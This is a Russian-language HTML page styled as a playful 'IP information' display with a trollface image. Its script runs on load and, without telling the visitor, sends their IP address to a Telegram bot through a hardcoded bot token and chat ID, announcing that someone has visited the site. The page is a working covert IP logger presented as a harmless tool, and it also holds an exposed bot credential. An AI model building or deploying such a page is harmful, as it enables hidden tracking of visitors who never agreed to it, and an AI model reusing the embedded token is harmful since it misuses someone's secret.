<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP Информация</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            text-align: center;
            color: #4a4a4a;
            margin-bottom: 30px;
            font-size: 2em;
        }
        .info-block {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .info-block p {
            margin: 10px 0;
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }
        .info-block p:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #764ba2;
        }
        .loading {
            text-align: center;
            color: #666;
        }
        .troll-image {
            width: 100px;
            display: block;
            margin: 20px auto 0;
            animation: float 3s ease-in-out infinite;
            cursor: pointer;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Информация</h1>
        <div id="info" class="info-block">
            <p class="loading">Загрузка данных...</p>
        </div>
        <img src="trollface.png" alt="Trollface" class="troll-image" id="trollImage">
    </div>

    <script>
        // ТВОИ ДАННЫЕ
        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
        const chatId = '1238755996';

        // ПРОСТАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ IP
        async function getIpInfo() {
            try {
                // Пробуем получить IP через разные сервисы
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                return {
                    ip: data.ip,
                    country: 'Неизвестно',
                    city: 'Неизвестно',
                    region: 'Неизвестно',
                    isp: 'Неизвестно'
                };
            } catch (error) {
                console.log('Ошибка:', error);
                return null;
            }
        }

        // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
        async function sendToTelegram(ipData) {
            const message = `🕵️ <b>Кто-то зашел на сайт!</b>

📍 <b>IP:</b> ${ipData.ip}
🌍 <b>Страна:</b> ${ipData.country}
🏙️ <b>Город:</b> ${ipData.city}
📡 <b>Провайдер:</b> ${ipData.isp}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('Отправлено!');
            } catch (error) {
                console.log('Ошибка Telegram:', error);
            }
        }

        // ПОКАЗ НА СТРАНИЦЕ
        async function showInfo() {
            const infoDiv = document.getElementById('info');
            
            const ipData = await getIpInfo();
            
            if (ipData && ipData.ip) {
                infoDiv.innerHTML = `
                    <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
                    <p><span class="label">Страна:</span> <span>${ipData.country}</span></p>
                    <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
                    <p><span class="label">Провайдер:</span> <span>${ipData.isp}</span></p>
                `;
                
                await sendToTelegram(ipData);
            } else {
                infoDiv.innerHTML = '<p class="loading">Не удалось получить данные</p>';
            }
        }

        // КЛИК ПО КАРТИНКЕ
        document.getElementById('trollImage').addEventListener('click', function() {
            alert('Обновляю...');
            showInfo();
        });

        // ЗАПУСК
        showInfo();
    </script>
</body>
</html>
